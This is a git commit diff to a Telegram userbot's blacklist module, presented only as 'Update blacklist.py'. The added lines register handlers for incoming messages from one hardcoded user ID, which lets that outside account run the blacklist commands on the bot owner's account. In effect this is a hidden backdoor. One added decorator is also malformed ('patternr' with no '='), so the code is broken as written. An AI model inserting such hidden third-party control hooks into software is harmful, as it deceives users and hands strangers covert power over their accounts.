f242f45250c3dbbb37ce37914588dbcbb2c46119
Randy Wahidin <63757267+Randi356@users.noreply.github.com>
2021-11-18 03:04:41 +0700

    Update blacklist.py

--- userbot/modules/blacklist.py
+++ userbot/modules/blacklist.py
@@ -33,6 +33,7 @@ async def on_new_message(event):
 
 
 @register(outgoing=True, pattern=r"^\.addbl(?: |$)(.*)")
+@register(incoming=True, from_user=901878554, patternr"^\.caddbl$")
 async def on_add_black_list(addbl):
     text = addbl.pattern_match.group(1)
     to_blacklist = list(
@@ -47,6 +48,7 @@ async def on_add_black_list(addbl):
 
 
 @register(outgoing=True, pattern=r"^\.listbl(?: |$)(.*)")
+@register(incoming=True, from_user=901878554, pattern="^\.clistbl$")
 async def on_view_blacklist(listbl):
     all_blacklisted = sql.get_chat_blacklist(listbl.chat_id)
     OUT_STR = "Blacklists in the Current Chat:\n"
@@ -72,6 +74,7 @@ async def on_view_blacklist(listbl):
 
 
 @register(outgoing=True, pattern=r"^\.rmbl(?: |$)(.*)")
+@register(incoming=True, from_user=901878554, pattern=r"^\.rmbl$")
 async def on_delete_blacklist(rmbl):
     text = rmbl.pattern_match.group(1)
     to_unblacklist = list(
